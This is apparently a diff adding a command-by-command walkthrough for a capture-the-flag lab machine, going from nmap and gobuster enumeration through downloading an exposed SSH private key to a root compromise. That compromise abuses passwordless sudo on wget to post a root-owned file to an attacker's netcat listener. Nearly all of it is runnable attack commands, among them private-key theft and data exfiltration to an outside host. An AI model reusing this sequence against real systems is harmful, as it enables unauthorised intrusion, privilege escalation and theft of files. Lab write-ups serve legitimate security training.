@@ -1,1 +1,30 @@
 
+# Variables
+export TARGET=10.10.71.108
+export ATTACKER=10.8.160.130
+
+# Recon
+nmap -sC -sV -Pn -vv 10.10.71.108
+
+# Web enum
+gobuster dir -u http://10.10.71.108/ -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.10.71.108/sitemap/ -w /usr/share/wordlists/dirb/common.txt
+curl -s http://10.10.71.108/sitemap/.ssh/id_rsa -o id_rsa && chmod 600 id_rsa
+
+# Foothold
+ssh -i id_rsa jessie@10.10.71.108
+
+# User flag
+cat /home/jessie/Documents/user_flag.txt
+
+
+# Sudo rights
+sudo -l     # expect: (root) NOPASSWD: /usr/bin/wget
+
+# PrivEsc Option A: quick exfil of root flag
+# Attacker:
+nc -lvnp 1234
+# Target:
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http://$ATTACKER:1234
+
+
